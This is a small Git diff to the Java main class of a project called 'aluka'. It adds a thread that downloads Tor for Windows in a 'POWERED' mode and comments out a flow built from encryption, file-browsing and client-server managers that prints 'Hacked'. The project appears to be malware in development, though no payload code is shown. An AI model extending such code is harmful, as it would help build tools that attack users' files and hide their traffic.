@@ -3,6 +3,7 @@ package aluka;
 import java.util.HashMap;
 
 import aluka.configuration.Configuration;
+import aluka.configuration.DownloadTor;
 import aluka.core.ClientServerManager;
 import aluka.core.EncryptionManager;
 import aluka.core.FileDeeperBrowser;
@@ -21,11 +22,12 @@ public static final String MODE = "POWERED";
 	public static void main(String[] args) {
 		
 		if(MODE.equals("POWERED")) {
-			
+			Thread thread = new Thread(new DownloadTor("windows"));
+			thread.start();
 		}
 		
 		
-		EncryptionManager encryption = new EncryptionManager();
+		/*EncryptionManager encryption = new EncryptionManager();
 		SystemManager system = new SystemManager();
 		StateManager stateManager = new StateManager(system.getConfigPath());
 
@@ -69,6 +71,6 @@ public static final String MODE = "POWERED";
 				System.out.println("Hacked");
 			}
 		}
-
+	*/
 	}
 }
